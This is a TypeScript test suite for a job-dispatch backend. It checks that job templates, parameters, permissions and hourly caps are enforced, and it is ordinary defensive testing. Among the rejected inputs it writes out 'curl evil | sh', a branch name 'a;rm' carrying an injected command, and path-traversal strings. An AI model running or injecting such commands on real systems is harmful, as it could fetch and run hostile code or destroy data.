// Jobs, layer 1 of the multi-Mac dispatch design (docs/specs/2026-11-26-multi-mac-dispatch-design.md,
// AC1, AC2, AC7; docs/protocol/runners.md, "Jobs"): the owner writes named job
// templates, a runner key reads them and files a request that names one, and
// the backend refuses a request that doesn't fit the job before the main Mac
// could ever start it without a card.
import { test } from 'node:test';
import assert from 'node:assert/strict';
import { call, load, outcome, THREAD_BASICS } from '../helpers/convex-memory.ts';
import { boxBackend, later, OWNER } from '../helpers/box-backend.ts';

const sync = load('sync');
const relay = load('relay');
const { ACCESS } = load('runnerAccess') as { ACCESS: Record<string, string> };
const { sha256 } = load('lib') as { sha256: (s: string) => Promise<string> };

const LAPTOP_KEY = 'tbr_laptop';
const LAPTOP = 'a1b2c3d4e5f6';
const MINI = '57a6cebe9e82';
const HOUR = 60 * 60 * 1000;

const job = (over: Record<string, unknown> = {}) => ({
  name: 'capture-evidence',
  target: MINI,
  repos: ['csdev19/threadbear', 'csdev19/other'],
  params: { repo: 'repo', branch: 'branch', pr: 'int' },
  mode: 'auto',
  perHour: 6,
  brief: 'In ~/code/{repo}, check out {branch}, run the e2e suite and post screenshots on PR #{pr}.',
  ...over,
});
const good = { repo: 'csdev19/threadbear', branch: 'feature/fix-login', pr: '42' };

async function setup() {
  const s = await boxBackend();
  await s.ctx.db.insert('runnerKeys', { runnerId: LAPTOP, keyHash: await sha256(LAPTOP_KEY), name: 'laptop', createdAt: 1 });
  await s.ctx.db.insert('runners', { runnerId: LAPTOP, name: 'laptop', version: 'v', startedAt: 'x', draining: false, threadCount: 1, lastSeenAt: Date.now() });
  await call(s.ctx, sync.upsertThreads, { key: LAPTOP_KEY, threads: [{ ...THREAD_BASICS, threadId: 'L', runnerId: LAPTOP, title: 'laptop thread', view: 'inbox', needsYou: false }] });
  const { boxKey } = await s.boot();
  let n = 0;
  const publish = (...jobs: Record<string, unknown>[]) => call(s.ctx, relay.setJobs, { key: OWNER, jobs });
  // A request naming a job, as a runner key's Mac files it.
  const ask = (name: string, params: Record<string, string>, over: Record<string, unknown> = {}, target = MINI) =>
    call(s.ctx, relay.fileRequest, { key: LAPTOP_KEY, requestId: `req-job-${String(++n).padStart(4, '0')}`, threadId: 'L', target, request: { text: '', job: name, params, ...over } });
  const requests = () => s.rows('runnerRequests');
  return { ...s, boxKey, publish, ask, requests };
}

test('the jobs are in the access table: setJobs is the owner key only, jobsList any runner key', () => {
  assert.equal(ACCESS.setJobs, 'owner');
  assert.equal(ACCESS.jobsList, 'shared');
});

test('AC1: a request naming a job the owner has not defined is refused, and nothing is filed', async () => {
  const s = await setup();
  assert.equal(await outcome(s.ask('capture-evidence', good)), 'badArgs', 'no jobs at all');
  await s.publish(job());
  assert.equal(await outcome(s.ask('other-job', good)), 'badArgs', 'another name');
  assert.equal(await outcome(s.ask('Capture-Evidence', good)), 'badArgs', 'a name is compared as it is');
  assert.equal(s.requests().length, 0);
});

test('AC2: a job request whose parameters fail the job schema is refused', async () => {
  const s = await setup();
  await s.publish(job());
  const bad: [string, Record<string, string>][] = [
    ['a missing parameter', { repo: good.repo, branch: good.branch }],
    ['no parameters', {}],
    ['an extra parameter', { ...good, extra: 'x' }],
    ['a repo outside the list', { ...good, repo: 'evil/threadbear' }],
    ['a repo with a path', { ...good, repo: 'csdev19/threadbear/../x' }],
    ['a branch with ..', { ...good, branch: 'feature/../main' }],
    ['a branch with a space', { ...good, branch: 'my branch' }],
    ['a branch with a newline', { ...good, branch: 'a\nb' }],
    ['a branch with a leading -', { ...good, branch: '-fix' }],
    ['a branch with a shell character', { ...good, branch: 'a;rm' }],
    ['a branch with ~', { ...good, branch: 'a~1' }],
    ['a branch with a backslash', { ...good, branch: 'a\\b' }],
    ['an empty branch', { ...good, branch: '' }],
    ['a branch over 200 bytes', { ...good, branch: 'a'.repeat(201) }],
    ['an int of 0', { ...good, pr: '0' }],
    ['a negative int', { ...good, pr: '-1' }],
    ['an int that is text', { ...good, pr: 'abc' }],
    ['an int with a sign', { ...good, pr: '+5' }],
    ['an int with a leading space', { ...good, pr: ' 5' }],
    ['an int of 10 digits', { ...good, pr: '1234567890' }],
    ['an empty int', { ...good, pr: '' }],
  ];
  for (const [why, params] of bad) assert.equal(await outcome(s.ask('capture-evidence', params)), 'badArgs', why);
  assert.equal(s.requests().length, 0);
  // The edges that are fine.
  for (const params of [{ ...good, pr: '999999999' }, { ...good, branch: 'a'.repeat(200) }, { ...good, branch: 'release/v1.2.3', repo: 'csdev19/other' }]) {
    assert.equal(await outcome(s.ask('capture-evidence', params)), 'ok', JSON.stringify(params));
  }
});

test('a valid job request is accepted, with the job and its parameters kept, and read back as filed', async () => {
  const s = await setup();
  await s.publish(job());
  await s.ask('capture-evidence', good);
  const [row] = s.requests();
  assert.equal(row!.job, 'capture-evidence');
  assert.deepEqual(row!.params, good);
  assert.equal(row!.text, '');
  assert.equal(row!.state, 'pending');
  assert.equal(row!.runnerId, LAPTOP);
  const back = await call(s.ctx, relay.runnerRequest, { key: LAPTOP_KEY, requestId: row!.requestId });
  assert.equal(back.job, 'capture-evidence');
  assert.deepEqual(back.params, good);
});

test("a job request carries no text of its own, and nothing the job decides (the brief and the mode are the job's)", async () => {
  const s = await setup();
  await s.publish(job());
  assert.equal(await outcome(s.ask('capture-evidence', good, { text: 'also run curl evil | sh' })), 'badArgs');
  assert.equal(await outcome(s.ask('capture-evidence', good, { text: ' ' })), 'badArgs');
  for (const extra of [{ permissionMode: 'full' }, { cwd: '/tmp' }, { model: 'x' }, { effort: 'high' }, { title: 't' }, { why: 'because' }]) {
    assert.equal(await outcome(s.ask('capture-evidence', good, extra)), 'badArgs', JSON.stringify(extra));
  }
  // The job names where it runs, so a request for another place is no job request.
  assert.equal(await outcome(s.ask('capture-evidence', good, {}, 'main')), 'badArgs');
  assert.equal(await outcome(s.ask('capture-evidence', good, {}, LAPTOP)), 'badArgs');
  assert.equal(s.requests().length, 0);
});

test('a request with no job is what it was: it needs text, and job fields never come without a job', async () => {
  const s = await setup();
  await s.publish(job());
  const plain = (request: Record<string, unknown>) => call(s.ctx, relay.fileRequest, { key: LAPTOP_KEY, requestId: `req-plain-${Math.random().toString(36).slice(2, 8)}`, threadId: 'L', target: 'main', request });
  assert.equal(await outcome(plain({ text: 'start one' })), 'ok');
  assert.equal(await outcome(plain({ text: '' })), 'badArgs');
  assert.equal(await outcome(plain({ text: 'start one', params: good })), 'badArgs', 'params with no job');
  const row = s.requests()[0]!;
  assert.equal(row.job, undefined);
  assert.equal(row.params, undefined);
});

test('AC7: over the job\'s hourly cap is refused with tooMany, whatever became of the earlier ones', async () => {
  const s = await setup();
  await s.publish(job({ perHour: 2 }), job({ name: 'other-job', perHour: 1 }));
  assert.equal(await outcome(s.ask('capture-evidence', good)), 'ok');
  assert.equal(await outcome(s.ask('capture-evidence', good)), 'ok');
  assert.equal(await outcome(s.ask('capture-evidence', good)), 'tooMany', 'cap + 1');
  // Answered or closed, they still count: the cap is on filing.
  for (const r of s.requests()) await call(s.ctx, relay.decideRequest, { key: OWNER, requestId: r.requestId, docId: String(r._id), state: 'denied' });
  assert.equal(await outcome(s.ask('capture-evidence', good)), 'tooMany', 'all denied');
  // Another job has its own count.
  assert.equal(await outcome(s.ask('other-job', good)), 'ok');
  assert.equal(await outcome(s.ask('other-job', good)), 'tooMany');
  // An hour on, they no longer count.
  assert.equal(await outcome(later(HOUR + 60_000, () => s.ask('capture-evidence', good))), 'ok');
});

test("the job's cap holds when the runner's 50 kept requests are full: a recent job request is never the one made room for", async () => {
  const s = await setup();
  await s.publish(job({ perHour: 1 }));
  await s.ask('capture-evidence', good);
  const first = s.requests()[0]!;
  // 49 more of its rows, so it holds 50 (a request filed now is made room for).
  for (let i = 0; i < 49; i++) {
    await s.ctx.db.insert('runnerRequests', { requestId: `req-fill-${String(i).padStart(3, '0')}`, runnerId: LAPTOP, threadId: 'L', target: 'main', text: 'x', createdAt: Date.now() - 1000 + i, state: 'closed', requestState: { kind: 'closed', decidedAt: Date.now() } });
  }
  await call(s.ctx, relay.fileRequest, { key: LAPTOP_KEY, requestId: 'req-plain-one', threadId: 'L', target: 'main', request: { text: 'start one' } });
  assert.ok(s.requests().some((r) => r.requestId === first.requestId), 'the job request is still counted');
  assert.equal(await outcome(s.ask('capture-evidence', good)), 'tooMany');
});

test('setJobs is the owner key only: a runner key and a box key are refused, and nothing changes', async () => {
  const s = await setup();
  await s.publish(job());
  const as = (key: string) => call(s.ctx, relay.setJobs, { key, jobs: [job({ name: 'sneaky', mode: 'full' })] });
  assert.equal(await outcome(as(LAPTOP_KEY)), 'forbidden');
  assert.equal(await outcome(as(s.boxKey)), 'forbidden');
  assert.equal(await outcome(as('tbr_unknown')), 'auth');
  assert.deepEqual((await call(s.ctx, relay.jobsList, { key: OWNER })).map((j: { name: string }) => j.name), ['capture-evidence']);
});

test('jobsList: the owner key and a runner key read the jobs, a box key is refused', async () => {
  const s = await setup();
  await s.publish(job({ name: 'zeta' }), job());
  const names = async (key: string) => (await call(s.ctx, relay.jobsList, { key })).map((j: { name: string }) => j.name);
  assert.deepEqual(await names(OWNER), ['capture-evidence', 'zeta']);
  assert.deepEqual(await names(LAPTOP_KEY), ['capture-evidence', 'zeta']);
  assert.equal(await outcome(call(s.ctx, relay.jobsList, { key: s.boxKey })), 'forbidden');
  const [first] = await call(s.ctx, relay.jobsList, { key: LAPTOP_KEY });
  assert.deepEqual({ ...first, updatedAt: undefined }, { ...job(), updatedAt: undefined });
  assert.equal(typeof first.updatedAt, 'number');
});

test('setJobs replaces the whole list, and checks every job before it changes any', async () => {
  const s = await setup();
  await s.publish(job(), job({ name: 'second' }));
  await s.publish(job({ name: 'third' }));
  assert.deepEqual((await call(s.ctx, relay.jobsList, { key: OWNER })).map((j: { name: string }) => j.name), ['third']);
  // One bad job and the list stays as it was.
  assert.equal(await outcome(s.publish(job({ name: 'fine' }), job({ name: 'Bad Name' }))), 'badArgs');
  assert.deepEqual((await call(s.ctx, relay.jobsList, { key: OWNER })).map((j: { name: string }) => j.name), ['third']);
  await s.publish();
  assert.deepEqual(await call(s.ctx, relay.jobsList, { key: OWNER }), []);
});

test('setJobs refuses a brief with a shell ${undeclared}: a word in braces is a placeholder even after $', async () => {
  const s = await setup();
  assert.equal(await outcome(s.publish(job({ brief: 'cd ${undeclared} && ls' }))), 'badArgs');
  await s.publish(job({ brief: 'cd ${repo} && ls' }));
});

test('setJobs refuses a job whose fields are out of range', async () => {
  const s = await setup();
  const bad: [string, Record<string, unknown>][] = [
    ['an empty name', { name: '' }],
    ['an upper-case name', { name: 'Capture' }],
    ['a name with a space', { name: 'a b' }],
    ['a name with an underscore', { name: 'a_b' }],
    ['a name of 41 characters', { name: 'a'.repeat(41) }],
    ['a target that is a name', { target: 'mac mini' }],
    ['an empty target', { target: '' }],
    ['no repos', { repos: [] }],
    ['a repo that is a URL', { repos: ['https://github.com/a/b'] }],
    ['a repo with no owner', { repos: ['threadbear'] }],
    ['a repo with ..', { repos: ['a/..'] }],
    ['a repo with a space', { repos: ['a/b c'] }],
    ['the same repo twice', { repos: ['a/b', 'a/b'] }],
    ['a parameter name with a brace', { params: { 'a}': 'int' } }],
    ['a parameter name with an upper-case letter', { params: { PR: 'int' } }],
    ['a perHour of 0', { perHour: 0 }],
    ['a perHour of 61', { perHour: 61 }],
    ['a perHour with a fraction', { perHour: 1.5 }],
    ['a brief that is empty', { brief: '' }],
    ['a brief over 4000 bytes', { brief: 'é'.repeat(2001) }],
    ['a brief with a placeholder no parameter has', { brief: 'run {nope}' }],
  ];
  for (const [why, over] of bad) assert.equal(await outcome(s.publish(job(over))), 'badArgs', why);
  // The validators refuse the rest: no mode (never Full by omission), a mode or a parameter kind it doesn't know.
  const { mode: _m, ...noMode } = job();
  for (const j of [noMode, job({ mode: 'yolo' }), job({ params: { repo: 'repo', x: 'string' } })]) {
    await assert.rejects(call(s.ctx, relay.setJobs, { key: OWNER, jobs: [j] }), /validators/);
  }
  // The edges that are fine, and a job of no parameters.
  await s.publish(job({ name: 'a'.repeat(40), perHour: 60, mode: 'full', brief: 'é'.repeat(2000) }), job({ name: 'plain', params: {}, brief: 'run the tests ({not a param}) {"a":1}' }));
  assert.equal((await call(s.ctx, relay.jobsList, { key: OWNER })).length, 2);
});

test('a job with no repo parameter takes no repo, and the repo list is only checked for one', async () => {
  const s = await setup();
  await s.publish(job({ name: 'tests', params: { branch: 'branch' }, brief: 'run the tests on {branch}' }));
  assert.equal(await outcome(s.ask('tests', { branch: 'main' })), 'ok');
  assert.equal(await outcome(s.ask('tests', { branch: 'main', repo: 'csdev19/threadbear' })), 'badArgs');
});

test('setJobs refuses a brief using an inherited name ({constructor}, {toString}) with no such parameter', async () => {
  const s = await setup();
  // Only a lower-case word is a placeholder, so {constructor} is the inherited name that reaches the check.
  assert.equal(await outcome(s.publish(job({ params: {}, brief: 'Run {constructor}' }))), 'badArgs');
  await s.publish(job({ params: { constructor: 'branch' }, brief: 'Run {constructor}' }));
});

test('fileRequest refuses params naming an inherited property for a job without that parameter', async () => {
  const s = await setup();
  await s.publish(job({ name: 'plain', params: {}, brief: 'run the tests' }));
  assert.equal(await outcome(s.ask('plain', { constructor: 'x' })), 'badArgs');
  assert.equal(await outcome(s.ask('plain', { toString: 'x' })), 'badArgs');
  assert.equal(s.requests().length, 0);
});

test('a job request cannot be claimed or allowed (the old runner path), but can still be denied', async () => {
  const s = await setup();
  await s.publish(job());
  await s.ask('capture-evidence', good);
  const [a] = s.requests();
  // The previous runner's answerNow: claim with the owner key, before it creates a thread.
  const decide = (row: { _id: unknown; [k: string]: unknown }, state: string, extra: Record<string, unknown> = {}) =>
    call(s.ctx, relay.decideRequest, { key: OWNER, requestId: row.requestId as string, docId: String(row._id), state, ...extra });
  assert.equal(await outcome(decide(a!, 'claimed', { claim: 'claim-abcdefgh' })), 'badArgs');
  assert.equal(await outcome(decide(a!, 'allowed', { result: { runnerId: MINI, runnerName: 'mini', threadId: 'T' } })), 'badArgs');
  assert.equal(s.requests().find((r) => r.requestId === a!.requestId)!.state, 'pending');
  // Denying still works.
  assert.equal(await outcome(decide(a!, 'denied')), 'ok');
  assert.equal(s.requests().find((r) => r.requestId === a!.requestId)!.state, 'denied');
});

// ---- layer 2: the job starter's two backend pieces (docs/protocol/runners.md, "The job starter")

const claimArgs = { claim: 'claim-abcdefgh' };
const decide = (s: Awaited<ReturnType<typeof setup>>, row: { _id: unknown; [k: string]: unknown }, state: string, extra: Record<string, unknown> = {}, key = OWNER) =>
  call(s.ctx, relay.decideRequest, { key, requestId: row.requestId as string, docId: String(row._id), state, ...extra });
const rowOf = (s: Awaited<ReturnType<typeof setup>>, requestId: string) => s.requests().find((r) => r.requestId === requestId)! as unknown as { _id: unknown; requestId: string; [k: string]: unknown };
const at = { runnerId: MINI, runnerName: 'mini', threadId: 'T-new' };

test('pendingJobRequests is the owner key only', async () => {
  assert.equal(ACCESS.pendingJobRequests, 'owner');
  const s = await setup();
  await s.publish(job());
  await s.ask('capture-evidence', good);
  assert.equal(await outcome(call(s.ctx, relay.pendingJobRequests, { key: LAPTOP_KEY })), 'forbidden', 'a runner key');
  assert.equal(await outcome(call(s.ctx, relay.pendingJobRequests, { key: s.boxKey })), 'forbidden', 'a box key');
  assert.equal(await outcome(call(s.ctx, relay.pendingJobRequests, { key: 'tbr_nobody' })), 'auth', 'no key');
  assert.equal(await outcome(call(s.ctx, relay.pendingJobRequests, { key: OWNER })), 'ok');
});

test('pendingJobRequests lists the pending requests that name a job, oldest first, with what the starter needs', async () => {
  const s = await setup();
  await s.publish(job());
  // A free-text request is never in it.
  await call(s.ctx, relay.fileRequest, { key: LAPTOP_KEY, requestId: 'req-text-0001', threadId: 'L', target: 'main', request: { text: 'do a thing' } });
  await s.ask('capture-evidence', good);
  await s.ask('capture-evidence', { ...good, pr: '43' });
  const list = await call(s.ctx, relay.pendingJobRequests, { key: OWNER });
  assert.deepEqual(list.map((r: { requestId: string }) => r.requestId), ['req-job-0001', 'req-job-0002']);
  const [first] = list;
  assert.deepEqual(Object.keys(first).sort(), ['createdAt', 'docId', 'job', 'params', 'requestId', 'runnerId', 'runnerName', 'state', 'target', 'threadId']);
  assert.equal(first.job, 'capture-evidence');
  assert.deepEqual(first.params, good);
  assert.equal(first.runnerId, LAPTOP);
  assert.equal(first.runnerName, 'laptop');
  assert.equal(first.threadId, 'L');
  assert.equal(first.target, MINI);
  assert.equal(first.docId, String(rowOf(s, 'req-job-0001')._id));
  // One that is no longer pending leaves the list.
  await decide(s, rowOf(s, 'req-job-0001'), 'denied');
  assert.deepEqual((await call(s.ctx, relay.pendingJobRequests, { key: OWNER })).map((r: { requestId: string }) => r.requestId), ['req-job-0002']);
});

test('pendingJobRequests is bounded at 20', async () => {
  const s = await setup();
  await s.publish(job({ perHour: 60 }));
  // A runner key may have 5 requests waiting, so 5 keys make 25.
  for (let k = 0; k < 5; k++) {
    const id = `b1b2c3d4e5f${k}`;
    const key = `tbr_more${k}`;
    await s.ctx.db.insert('runnerKeys', { runnerId: id, keyHash: await sha256(key), name: `more${k}`, createdAt: 1 });
    await call(s.ctx, sync.upsertThreads, { key, threads: [{ ...THREAD_BASICS, threadId: `M${k}`, runnerId: id, title: 'more', view: 'inbox', needsYou: false }] });
    for (let i = 0; i < 5; i++) await call(s.ctx, relay.fileRequest, { key, requestId: `req-more-${k}-${i}-abc`, threadId: `M${k}`, target: MINI, request: { text: '', job: 'capture-evidence', params: good } });
  }
  assert.equal(s.requests().length, 25);
  assert.equal((await call(s.ctx, relay.pendingJobRequests, { key: OWNER })).length, 20);
});

test('decideRequest with jobStart: the owner key claims and allows a job request at the job target', async () => {
  const s = await setup();
  await s.publish(job());
  await s.ask('capture-evidence', good);
  const a = rowOf(s, 'req-job-0001');
  assert.equal(await outcome(decide(s, a, 'claimed', { ...claimArgs, jobStart: true })), 'ok');
  assert.equal(rowOf(s, a.requestId).state, 'claimed');
  assert.equal(await outcome(decide(s, a, 'allowed', { result: at, jobStart: true })), 'ok');
  const done = rowOf(s, a.requestId);
  assert.equal(done.state, 'allowed');
  assert.deepEqual(done.result, at);
});

test('decideRequest without jobStart still refuses claimed and allowed for a job row (the old runner path)', async () => {
  const s = await setup();
  await s.publish(job());
  await s.ask('capture-evidence', good);
  const a = rowOf(s, 'req-job-0001');
  assert.equal(await outcome(decide(s, a, 'claimed', claimArgs)), 'badArgs');
  assert.equal(await outcome(decide(s, a, 'claimed', { ...claimArgs, jobStart: false })), 'badArgs');
  // Even once claimed by the starter, an allowed with no jobStart is refused.
  await decide(s, a, 'claimed', { ...claimArgs, jobStart: true });
  assert.equal(await outcome(decide(s, a, 'allowed', { result: at })), 'badArgs');
  assert.equal(rowOf(s, a.requestId).state, 'claimed');
});

test('decideRequest with jobStart refuses an allowed whose result.runnerId is not the job target', async () => {
  const s = await setup();
  await s.publish(job());
  await s.ask('capture-evidence', good);
  const a = rowOf(s, 'req-job-0001');
  await decide(s, a, 'claimed', { ...claimArgs, jobStart: true });
  assert.equal(await outcome(decide(s, a, 'allowed', { result: { ...at, runnerId: LAPTOP }, jobStart: true })), 'badArgs', 'another runner');
  assert.equal(await outcome(decide(s, a, 'allowed', { result: { ...at, runnerId: 'mini' }, jobStart: true })), 'badArgs', 'a name');
  assert.equal(await outcome(decide(s, a, 'allowed', { jobStart: true })), 'badArgs', 'no result');
  assert.equal(rowOf(s, a.requestId).state, 'claimed');
  assert.equal(await outcome(decide(s, a, 'allowed', { result: at, jobStart: true })), 'ok');
});

test('decideRequest with jobStart on a row that names no job is refused', async () => {
  const s = await setup();
  await call(s.ctx, relay.fileRequest, { key: LAPTOP_KEY, requestId: 'req-text-0001', threadId: 'L', target: 'main', request: { text: 'do a thing' } });
  const a = rowOf(s, 'req-text-0001');
  assert.equal(await outcome(decide(s, a, 'claimed', { ...claimArgs, jobStart: true })), 'badArgs');
  assert.equal(await outcome(decide(s, a, 'denied', { jobStart: true })), 'badArgs');
  assert.equal(rowOf(s, a.requestId).state, 'pending');
  // As it was: the card path claims it.
  assert.equal(await outcome(decide(s, a, 'claimed', claimArgs)), 'ok');
});

test('a runner key cannot decide a request at all, with or without jobStart', async () => {
  const s = await setup();
  await s.publish(job());
  await s.ask('capture-evidence', good);
  const a = rowOf(s, 'req-job-0001');
  assert.equal(await outcome(decide(s, a, 'claimed', { ...claimArgs, jobStart: true }, LAPTOP_KEY)), 'forbidden');
  assert.equal(await outcome(decide(s, a, 'denied', {}, LAPTOP_KEY)), 'forbidden');
  assert.equal(rowOf(s, a.requestId).state, 'pending');
});

test('a started job request can be handed back and denied, as any other claim', async () => {
  const s = await setup();
  await s.publish(job());
  await s.ask('capture-evidence', good);
  const a = rowOf(s, 'req-job-0001');
  await decide(s, a, 'claimed', { ...claimArgs, jobStart: true });
  assert.equal(await outcome(decide(s, a, 'pending')), 'ok');
  assert.equal(await outcome(decide(s, a, 'denied')), 'ok');
  assert.equal(rowOf(s, a.requestId).state, 'denied');
});

test('a claimed job request is denied straight from claimed with jobStart; without jobStart, and for a request with no job, it is refused', async () => {
  const s = await setup();
  await s.publish(job({ perHour: 60 }));
  await s.ask('capture-evidence', good);
  await s.ask('capture-evidence', { ...good, pr: '43' });
  await call(s.ctx, relay.fileRequest, { key: LAPTOP_KEY, requestId: 'req-plain-0001', threadId: 'L', target: 'main', request: { text: 'start one' } });
  const [a, b, plain] = ['req-job-0001', 'req-job-0002', 'req-plain-0001'].map((id) => rowOf(s, id));
  await decide(s, a, 'claimed', { ...claimArgs, jobStart: true });
  await decide(s, b, 'claimed', { ...claimArgs, jobStart: true });
  // Without jobStart a claimed job row stays claimed.
  assert.equal(await outcome(decide(s, a, 'denied')), 'badArgs');
  assert.equal(rowOf(s, a.requestId).state, 'claimed');
  assert.equal(await outcome(decide(s, a, 'denied', { jobStart: true })), 'ok');
  assert.equal(rowOf(s, a.requestId).state, 'denied');
  // A denied row is final.
  assert.equal(await outcome(decide(s, a, 'denied', { jobStart: true })), 'badArgs');
  // A pending job row is still denied as before, with or without jobStart.
  assert.equal(await outcome(decide(s, b, 'pending')), 'ok');
  assert.equal(await outcome(decide(s, b, 'denied')), 'ok');
  // A request with no job: jobStart is refused, and a claimed one can't be denied.
  assert.equal(rowOf(s, plain.requestId).job, undefined);
  assert.equal(await outcome(decide(s, plain, 'claimed', claimArgs)), 'ok');
  assert.equal(await outcome(decide(s, plain, 'denied', { jobStart: true })), 'badArgs');
  assert.equal(await outcome(decide(s, plain, 'denied')), 'badArgs');
  assert.equal(rowOf(s, plain.requestId).state, 'claimed');
});

test('pendingJobRequests finds a job request behind 120 older pending free-text requests', async () => {
  const s = await setup();
  await s.publish(job());
  for (let i = 0; i < 120; i++) {
    await s.ctx.db.insert('runnerRequests', { requestId: `req-old-${String(i).padStart(4, '0')}`, runnerId: `old${i % 4}`, threadId: 'L', target: 'main', text: 'old', createdAt: 1 + i, state: 'pending', requestState: { kind: 'pending' } });
  }
  await s.ask('capture-evidence', good);
  assert.equal(s.requests().length, 121);
  const list = await call(s.ctx, relay.pendingJobRequests, { key: OWNER });
  assert.deepEqual(list.map((r: { job: string }) => r.job), ['capture-evidence']);
});

test('pendingJobRequests also returns a claimed job request left more than 10 minutes, with state claimed', async () => {
  const s = await setup();
  await s.publish(job({ perHour: 60 }));
  await s.ask('capture-evidence', good);
  await s.ask('capture-evidence', { ...good, pr: '43' });
  await s.ask('capture-evidence', { ...good, pr: '44' });
  await later(-11 * 60_000, () => decide(s, rowOf(s, 'req-job-0001'), 'claimed', { ...claimArgs, jobStart: true }));
  await decide(s, rowOf(s, 'req-job-0002'), 'claimed', { ...claimArgs, jobStart: true });
  const list = await call(s.ctx, relay.pendingJobRequests, { key: OWNER });
  assert.deepEqual(list.map((r: { requestId: string; state: string }) => [r.requestId, r.state]), [['req-job-0001', 'claimed'], ['req-job-0003', 'pending']]);
});
